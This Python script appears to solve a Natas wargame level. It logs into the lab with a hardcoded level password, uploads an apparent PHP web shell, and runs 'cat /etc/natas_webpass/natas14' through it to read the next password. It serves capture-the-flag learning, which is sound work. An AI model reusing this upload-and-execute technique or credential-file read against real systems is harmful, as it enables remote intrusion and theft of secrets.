#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.post(url, auth = (username, password), data = {"filename" : "Natas13.php", "MAX_FILE_SIZE" : "1000"}, files = {"uploadedfile" : open('Natas13.php', 'rb')})
content = response.text

Link = (re.findall('The file <a href="(.*)">u', content)[0])
response1 = session.get(url + '%s/?c=cat /etc/natas_webpass/natas14' % Link, auth = (username, password))
content1 = response1.text

#Printing the Source Code
#print(content1)

#Printing only the Password
print(re.findall('\n(.*)', content1)[0])